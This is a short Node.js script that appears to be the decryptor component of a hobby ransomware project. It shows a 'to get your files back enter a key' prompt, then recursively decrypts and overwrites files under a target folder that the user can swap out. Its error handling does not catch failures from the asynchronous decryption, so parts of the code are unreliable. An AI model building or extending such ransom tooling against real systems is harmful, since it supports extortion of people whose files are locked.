fs = require('fs'), crypto = require('crypto');
crypto = require('crypto'), recursive = require("recursive-readdir"), readline = require('readline');
process.stdin.resume();

rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
})

rl.question('To get your files back enter a key below :) (Right click to paste)\n', answer => {
  try {
    decrypt = (text, key) => {
      const decipher = crypto.createDecipher('aes256', key)
      let decrypted = decipher.update(text, 'hex', 'utf8')
      decrypted += decipher.final('utf8')
      return decrypted
    }
    // Replace './test' with anything you want
      recursive("./test", ['index.exe', 'decrypt.exe'] , (err, files) => {
        for(let i of files){
          fs.writeFileSync(i, decrypt(fs.readFileSync(i, 'utf8'), JSON.stringify(answer)))
      }});
    }
    catch(e) {
      console.log('The key doesnt match, sorry :(');
    }
    console.log(`Have a nice day!. Press Ctrl + C to exit`);
})
